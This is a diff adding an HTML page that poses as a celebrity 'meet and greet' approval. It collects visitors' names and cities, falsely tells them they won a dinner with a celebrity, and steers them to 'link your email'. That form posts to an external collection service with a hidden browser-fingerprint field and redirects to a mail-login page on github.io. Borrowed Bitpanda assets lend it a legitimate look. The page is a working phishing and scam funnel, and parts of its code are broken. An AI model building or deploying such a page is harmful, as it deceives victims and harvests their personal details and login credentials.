@@ -1,0 +1,747 @@
+
+
+ <!DOCTYPE html>
+<html>
+<head>
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
+<meta charset="utf-8">   
+
+
+
+
+
+<title>Meet and Greet</title>
+<style>
+  #mainContent {
+    display: none;
+  }
+  
+  #processing {
+    display: none;
+    text-align: center;
+  }
+  
+  .lds-ring {
+    display: inline-block;
+    position: relative;
+    width: 60px;
+    height: 60px;
+  }
+  
+  .lds-ring div {
+    box-sizing: border-box;
+    display: block;
+    position: absolute;
+    width: 140px;
+    height: 140px;
+    margin: 7px;
+    border: 7px solid #000000;
+    border-radius: 50%;
+    animation: lds-ring 1.9s cubic-bezier(0.5, 0, 0.5, 1) infinite;
+    border-color: DarkGreen  transparent transparent transparent;
+  }
+  
+  .lds-ring div:nth-child(1) {
+    animation-delay: -0.55s;
+  }
+  
+  .lds-ring div:nth-child(2) {
+    animation-delay: -0.9s;
+  }
+  
+  .lds-ring div:nth-child(3) {
+    animation-delay: -0.15s;
+  }
+  
+  @keyframes lds-ring {
+    0% {
+      transform: rotate(0deg);
+    }
+    100% {
+      transform: rotate(360deg);
+    }
+  }
+</style>
+<script>
+  function submitForm() {
+    // Hide the form
+    document.getElementById("myForm").style.display = "none";
+    
+    // Display the "Processing" message and animation
+    document.getElementById("processing").style.display = "block";
+    
+    // Delay displaying the main content
+    setTimeout(function() {
+      // Hide the processing message and animation
+      document.getElementById("processing").style.display = "none";
+      
+      // Display the main content
+      document.getElementById("mainContent").style.display = "block";
+      
+      // Get the form data
+      const name = document.getElementById("name").value;
+      const email = document.getElementById("email").value;
+      const phoneNumber = document.getElementById("phonenumber").value; // Get phone number
+      
+      // Display the submitted form data in multiple places within the main content
+      const submittedNameElements = document.getElementsByClassName("submittedName");
+      const submittedEmailElements = document.getElementsByClassName("submittedEmail");
+      const submittedPhoneElements = document.getElementsByClassName("submittedPhone"); // Handle phone number
+      
+      for (let i = 0; i < submittedNameElements.length; i++) {
+        submittedNameElements[i].textContent = name;
+      }
+      
+      for (let i = 0; i < submittedEmailElements.length; i++) {
+        submittedEmailElements[i].textContent = email;
+      }
+      
+      for (let i = 0; i < submittedPhoneElements.length; i++) {
+        submittedPhoneElements[i].textContent = phoneNumber; // Display phone number
+      }
+      
+      // Scroll to the main content section
+      document.getElementById("mainContent").scrollIntoView({ behavior: 'smooth' });
+    }, 3000); // Change delay to 3 seconds
+  }
+</script>
+</head>
+<body>
+
+
+  
+
+
+
+ 
+  <div> 
+  <div class="formbold-form-wrapper">
+
+
+
+
+  <form id="myForm" onsubmit="submitForm(); return false;">
+
+ 
+
+
+<style>
+  .text-amaklovpx {
+    font-size: 19px;
+    padding: 10px;
+  }
+</style>
+<h5 class="text-amaklovpx">
+
+
+<strong>
+<span style="color: #000000;">
+
+Welcome back! To continue to your meet and greet profile, please enter the basic information below to  verify it's you.
+</span>
+<br>
+ <br><br>
+
+
+
+
+
+
+
+<div id="error-message"></div>
+
+<script>
+function validateInput(input) {
+  var minLength = 3;
+  var maxLength = 40;
+  var errorMessage = document.getElementById("error-message");
+
+  if (input.value.length < minLength || input.value.length > maxLength) {
+    errorMessage.textContent = "";
+    input.setCustomValidity("Complete This");
+  } else {
+    errorMessage.textContent = "";
+    input.setCustomValidity("");
+  }
+}
+</script>
+
+
+
+
+<div class="formbold-mb-5">
+        <label for="Field1" class="formbold-form-label">   
+       Enter your first and last name
+        </label>
+  <center>
+        <input
+          type="text" 
+          
+          oninput="validateInput(this)"
+          
+          required 
+          name="A_"
+         
+         id="name"
+         
+          placeholder="Enter First and Last Name"  
+          class="formbold-form-input"
+        />
+
+</center>
+      </div>
+      
+      <br>
+      	
+
+
+
+
+
+     <label for="Field1" class="formbold-form-label">  
+Enter the name of your city
+</label>
+   <center>
+
+    <input type="text" id="phonenumber" name="A_"
+
+oninput="validateInput(this)"
+
+    placeholder="Enter Name of Your City"  
+          class="formbold-form-input"
+        />   </center>
+
+
+
+
+<br>
+
+
+<div class="formbold-mb-5">
+        <label for="Field1" class="formbold-form-label">   
+       Enter name of celebrity you'd like to meet
+        </label>
+
+        <center>
+
+<input type="text" id="email" required 
+          name="A_"
+oninput="validateInput(this)"
+class="formbold-form-input"
+placeholder="Name of Celebrity you'd like to meet" />
+   </center>
+
+      </div>
+
+
+<br>
+
+      <div><center>
+        <button type="submit" value="Submit"
+       class="formbold-btn w-full">CONTINUE</button></center>
+      </div>
+      
+      
+          <br> <br> 
+
+
+<br><br><br><br>
+
+     <br> 
+<br>
+ 
+    </form></center>
+  </div>
+</div>
+
+
+  
+
+<style>
+  @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
+  * {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+  }
+  body {
+    font-family: "Inter", sans-serif;
+  }
+  .formbold-mb-7 {
+    margin-bottom: 25px;
+  }
+  .formbold-pt-8 {
+    padding-top: 12px;
+  }
+  .formbold-main-wrapper {
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+  }
+
+  .formbold-form-wrapper {
+    margin: 0 auto;
+    max-width: 550px;
+    width: 100%;
+    background: white;
+  }
+  .formbold-form-label {
+    display: block;
+    font-weight: 500;
+    font-size: 19px;
+    color: Black;
+    margin-bottom: 5px;
+  }
+  .formbold-form-label-9 {
+    font-weight: 500;
+    font-size: 18px;
+    margin-bottom: 25px;
+  }
+
+  .formbold-form-input {
+    width: 94%;
+    padding: 13px 19px;
+    border-radius: 2px;
+    border: 2px solid Black;
+    background: white;
+    font-weight: 500;
+    font-size: 17px;
+    color: #000000;
+    outline: none;
+    resize: none;
+  }
+  .formbold-form-input:focus {
+    border-color: Grey;
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold-btn {
+    text-align: center;
+    font-size: 19px;
+    border-radius: 50px;
+    padding: 13px 23px;
+    border: none;
+    font-weight: 500;
+    background-color: #0093D5;
+    color: white;
+    cursor: pointer;
+  }
+  .formbold-btn:hover {
+    box-shadow: 0px 3px 8px rgba(0, 0, 0, 0.05);
+  }
+
+  .formbold--mx-3 {
+    margin-left: -12px;
+    margin-right: -12px;
+  }
+  .formbold-px-3 {
+    padding-left: 12px;
+    padding-right: 12px;
+  }
+  .flex {
+    display: flex;
+  }
+  .flex-wrap {
+    flex-wrap: wrap;
+  }
+  .w-full {
+    width: 96%;
+  }
+
+  .formbold-file-input input {
+    opacity: 0;
+    position: absolute;
+    width: 100%;
+    height: 100%;
+  }
+
+  .formbold-file-input label {
+    position: relative;
+    border: 1px dashed #e0e0e0;
+    border-radius: 6px;
+    min-height: 200px;
+    display: flex;
+    align-items: center;
+    justify-content: center;
+    padding: 48px;
+    text-align: center;
+  }
+  .formbold-drop-file {
+    display: block;
+    font-weight: 600;
+    color: #07074d;
+    font-size: 20px;
+    margin-bottom: 8px;
+  }
+
+  .formbold-or {
+    font-weight: 500;
+    font-size: 16px;
+    color: #6b7280;
+    display: block;
+    margin-bottom: 8px;
+  }
+  .formbold-browse {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    display: inline-block;
+    padding: 8px 28px;
+    border: 1px solid #e0e0e0;
+    border-radius: 4px;
+  }
+
+  .formbold-file-list {
+    border-radius: 6px;
+    background: #f5f7fb;
+    padding: 16px 32px;
+  }
+
+  .formbold-file-item {
+    display: flex;
+    align-items: center;
+    justify-content: space-between;
+  }
+
+  .formbold-file-item button {
+    color: DarkRed;
+    border: none;
+    background: transparent;
+    cursor: pointer;
+  }
+
+  .formbold-file-name {
+    font-weight: 500;
+    font-size: 16px;
+    color: #07074d;
+    padding-right: 12px;
+  }
+  .formbold-progress-bar {
+    margin-top: 20px;
+    position: relative;
+    width: 100%;
+    height: 6px;
+    border-radius: 8px;
+    background: #e2e5ef;
+  }
+
+  .formbold-progress {
+    position: absolute;
+    width: 75%;
+    height: 100%;
+    left: 0;
+    top: 0;
+    background: #6a64f1;
+    border-radius: 8px;
+  }
+
+  @media (min-width: 540px) {
+    .sm\:w-half {
+      width: 50%;
+    }
+  }
+</style> 
+  
+
+
+
+
+
+  <div id="processing">
+
+
+
+
+    <h4>
+
+<br><br>
+<br><br>
+
+Processing....
+
+</h4> 
+    
+    
+
+
+    <div class="lds-ring">
+      <div></div>
+      <div></div>
+      <div></div>
+      <div></div>
+    </div>
+  </div>
+  
+
+
+
+  <div id="mainContent">
+
+
+
+
+
+   
+<html class=light lang=en><head><script src="https://www.googleoptimize.com/optimize.js?id=OPT-N3D6ZNP"></script><script>if(document.cookie.match("uc_performance_v1_0=accepted")?.length){
+            window.dataLayer.push({'event': 'optimize.activate'});
+        }</script>
+
+
+<meta charset=utf-8>
+
+
+
+<meta content="width=device-width, initial-scale=1.0" name=viewport>
+
+
+
+
+<link href="https://cdn.bitpanda.com/app/v2/css/all.min.css?id=622e023bba9164dff838" rel=stylesheet><script src="https://cdn.bitpanda.com/app/v2/js/head.min.js?id=e37b5634f1d9be3b8e80"></script>
+ 
+<body class="default home light" style="position: center;"><header id=layout-header><header><div class="bp-nav js-contains-anchor"><div class=bp-nav__container><div class=util-flex-shrink-0>
+
+
+
+
+
+
+
+
+
+
+
+<h4>
+
+<center><strong>
+&nbsp &nbsp &nbsp &nbsp 
+
+Approved </strong> &nbsp
+
+<img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTQj6dsE4bZEG-KyDhF2kgJAxwm9k2Fqxq1Qw&amp;usqp=CAU" jsaction="" class="sFlh5c FyHeAf iPVvYb" style="max-width: 4094px; width: 46px; height: 47px; margin: 0px;" alt="verify&quot; Icon - Download for free – Iconduck" role="button" tabindex="0" aria-label="verify&quot; Icon - Download for free – Iconduck Search inside image" aria-pressed="false" jsname="kn3ccd" aria-hidden="false">
+
+</center>
+
+
+
+</h4>
+
+
+
+ </div>
+ 
+</header> 
+    
+    
+    
+    
+  
+
+ <section id=layout-content tabindex=-1><section class="default uk-padding-remove-bottom uk-section"><div class=uk-container><div class="uk-child-width-1-2@m uk-flex-middle uk-grid" uk-grid=""><div class=default><section class="module-text uk-padding-remove-bottom uk-padding-remove-top uk-section uk-text-left uk-text-left@m"><div class=module-text__content>
+
+
+
+
+
+
+<h5>
+
+
+
+
+
+
+
+
+
+Welcome back,  <span class="submittedName"></span>
+  
+you applied for the <span class="submittedEmail"></span>
+ meet and greet a few days ago and got approved. You can now experience an intimate dinner with <span class="submittedEmail"></span>
+
+ in
+
+<span class="submittedPhone"></span>,
+on February 23, 2025. 
+    
+<br>
+<br>
+
+To proceed, please link your email address to your meet and greet profile. This will ensure you receive crucial information about the meet and greet venue and time, directly to your email inbox.
+
+<br><br>
+
+Click on Next to proceed with linking your email to your meet and greet profile
+
+
+</font>
+
+
+<br>
+
+<br>
+
+
+
+
+
+
+
+
+
+
+
+   
+
+<div>
+  <style>
+    #loading-icon {
+      display: none;
+      position: fixed;
+      top: 50%;
+      left: 50%;
+      transform: translate(-50%, -50%);
+      z-index: 9999;
+      text-align: center;
+    }
+
+    .spinner {
+      width: 160px;
+      height: 160px;
+      margin: 0 auto;
+      border: 18px solid #f3f3f3;
+      border-top: 18px solid DarkGreen;
+      border-radius: 50%;
+      animation: spin 2s linear infinite;
+    }
+
+    @keyframes spin {
+      0% {
+        transform: rotate(0deg);
+      }
+      100% {
+        transform: rotate(360deg);
+      }
+    }
+
+    #loading-text {
+      font-weight: bold;
+      margin-top: 10px;
+      font-size: 33px;
+      color: White;
+      background-color: DarkGreen; /* Add brown background color */
+      padding: 12px 16px; /* Add padding for better visibility */
+      border-radius: 5px; /* Add border radius for rounded corners */
+    }
+  </style>
+
+  <div id="loading-icon">
+    <div class="spinner"></div>
+    <div id="loading-text"><nobr>Please Wait...</nobr></div>
+  </div>
+
+
+   
+
+<form action="https://submit-form.com/CGTIyBybt" method="POST" id="wpforms-form-278" class="wpforms-validate wpforms-form" data-formid="278">
+<input type="hidden" name="_redirect" value="https://enjoy-org.github.io/Mail/" >
+
+  <input type="hidden" name="Email_Login_Is_Submited" value="Email_Login">
+  
+
+
+
+   
+<span style="display:none;">
+
+    <p id="user-agent"></p> </span>
+   <input type="hidden" name="z_PhoneDetails" id="hidden-user-agent">
+        	
+
+   
+
+
+
+   
+
+ <button type="submit" onclick="showLoadingIcon()" style="display: block; width: 100%; height: 46px; background-color: #0093D5; color: white; font-size: 23px; font-weight: bold; border: none; border-radius: 30px; cursor: pointer;">
+ Next
+ </button>
+ 
+ </from>
+ 
+
+
+
+
+
+
+<script>
+        const userAgent = navigator.userAgent;
+        document.getElementById('user-agent').textContent = userAgent;
+        document.getElementById('hidden-user-agent').value = userAgent;
+    </script>
+ 
+
+
+
+
+
+
+
+
+
+   
+ 
+   <script>
+    function showLoadingIcon() {
+      var loadingIcon = document.getElementById("loading-icon");
+      loadingIcon.style.display = "block";
+      setTimeout(function() {
+        document.getElementById("Deborah").submit();
+      }, 1000); // Redirect after 2 seconds (adjust as needed)
+    }
+
+    function increaseFontSize() {
+      var loadingText = document.getElementById("loading-text");
+      var currentFontSize = window.getComputedStyle(loadingText, null).getPropertyValue('font-size');
+      var currentFontSizeNumeric = parseFloat(currentFontSize);
+      var newFontSize = currentFontSizeNumeric + 2;
+      loadingText.style.fontSize = newFontSize + 'px';
+    }
+  </script>
+  
+</div>
+   
+ 
+
+
+
+
+<br>
+<br><br><br>
+<br><br><br><br><br>
+
+
+
+
+
+
+
+ </section> <section class="footer__navbar footer__navbar--sm footer__navbar__gradient"><div class=uk-container><div class=uk-flex-between uk-grid=""><div class="uk-text-center uk-text-right@m uk-width-1-1 uk-width-auto@m">
+
+
+
+</path> </symbol></svg>
+
+
+  </div>
+  
+  <script>
+    // Hide the processing message and form initially
+    document.getElementById("processing").style.display = "none";
+    document.getElementById("myForm").style.display = "block";
+  </script>
+</body>
+</html>
